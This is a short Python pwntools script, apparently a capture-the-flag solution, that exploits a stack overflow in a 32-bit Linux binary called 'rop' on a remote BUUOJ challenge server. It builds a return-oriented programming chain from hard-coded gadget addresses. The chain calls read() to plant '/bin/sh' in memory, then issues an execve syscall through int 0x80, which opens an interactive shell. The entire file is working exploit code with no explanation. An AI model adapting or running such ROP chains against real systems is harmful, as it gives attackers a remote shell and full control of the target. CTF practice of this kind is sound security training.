from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('rop')
io = remote('node4.buuoj.cn', 28616)
elf = ELF('rop')
read = elf.symbols['read']
pop_eax_ret = 0x080b8016 
pop_edx_ecx_ebx_ret = 0x0806ed00
int80h = 0x0806c943
buf = 0x080EC300

payload = cyclic(0x10)
# read(0, buf, 8)
payload += p32(read) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(buf) + p32(8)
# 11 execve('/bin/sh', 0, 0)
payload += p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(buf) + p32(int80h)

io.sendline(payload)
io.send(b'/bin/sh\x00')
io.interactive()

